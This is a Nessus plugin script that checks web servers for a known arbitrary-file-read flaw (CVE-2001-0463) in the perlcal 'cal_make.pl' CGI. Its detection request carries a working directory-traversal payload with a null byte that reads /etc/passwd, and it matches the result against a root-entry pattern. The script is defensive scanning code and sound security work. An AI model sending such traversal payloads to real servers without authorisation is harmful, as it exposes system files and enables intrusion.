#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10664);
 script_bugtraq_id(2663);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2001-0463");
 
 name["english"] = "perlcal";
 name["francais"] = "perlcal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'cal_make.pl' cgi is installed. This CGI has
a well known security flaw that lets anyone read arbitrary
files with the privileges of the http daemon (root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le cgi 'cal_make.pl' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
lire des fichiers arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/cal_make.pl";
 summary["francais"] = "Vérifie la présence de /cgi-bin/cal_make.pl";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 data = string(dir, "/cal_make.pl?p0=../../../../../../../../../etc/passwd%00");
 data = http_get(item:data, port:port);
 buf = http_keepalive_send_recv(port:port, data:data);
 if( buf == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))security_hole(port);
}
